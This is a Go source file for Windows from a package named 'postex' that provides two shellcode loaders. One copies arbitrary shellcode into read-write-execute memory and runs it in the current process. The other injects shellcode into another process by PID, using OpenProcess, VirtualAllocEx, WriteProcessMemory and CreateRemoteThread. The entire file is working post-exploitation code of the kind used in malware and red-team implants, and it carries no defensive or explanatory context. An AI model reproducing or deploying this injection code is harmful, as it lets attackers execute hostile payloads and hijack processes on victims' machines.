// +build windows

package postex
//Contains functions for loading and executing shellcode.

import "syscall"
import "unsafe"

// Spawn a new process and load some shellcode into it.

func ShellcodeWindows(sc []byte) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")

	const MEM_COMMIT = 0x1000
	const MEM_RESERVE = 0x2000
	const PAGE_EXECUTE_READWRITE = 0x40
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	syscall.Syscall(addr, 0, 0, 0, 0)

	return nil
}

// Inject shellcode into an existing process.

func ShellcodeInjectWindows(sc []byte, pid int) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")

	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")

	const PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	const MEM_COMMIT = 0x1000
	const MEM_RESERVE = 0x2000
	const PAGE_EXECUTE_READWRITE = 0x40

	proc_handle, _, _ := OpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	remote_buf, _, _ := VirtualAllocEx.Call(proc_handle, 0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	WriteProcessMemory.Call(proc_handle, remote_buf, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)
	CreateRemoteThread.Call(proc_handle, 0, 0, remote_buf, 0, 0, 0)
			
	return nil
}

